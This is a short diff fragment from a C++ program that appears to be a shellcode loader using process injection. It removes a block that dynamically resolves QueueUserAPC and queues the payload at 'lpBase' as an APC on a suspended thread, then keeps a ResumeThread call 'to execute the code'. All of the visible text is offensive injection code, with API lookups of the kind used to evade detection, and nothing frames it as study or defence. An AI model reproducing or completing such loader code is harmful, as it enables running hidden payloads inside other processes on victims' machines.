@@ -146,20 +146,6 @@ int main() {
     }
     std::cout << "Thread context set" << std::endl;
 
-    // Queue the APC to run the payload
-    auto pQueueUserAPC = (BOOL(WINAPI*)(PAPCFUNC, HANDLE, DWORD))GetProcAddress(hKernel32, "QueueUserAPC");
-    if (pQueueUserAPC == NULL) {
-        std::cerr << "Failed to get address of QueueUserAPC" << std::endl;
-        return -1;
-    }
-
-    success = pQueueUserAPC((PAPCFUNC)lpBase, pi.hThread, 0);
-    if (!success) {
-        std::cerr << "Failed to queue APC" << std::endl;
-        return -1;
-    }
-    std::cout << "APC queued" << std::endl;
-
     // Resume the thread to execute the code
     auto pResumeThread = (DWORD(WINAPI*)(HANDLE))GetProcAddress(hKernel32, "ResumeThread");
     if (pResumeThread == NULL) {
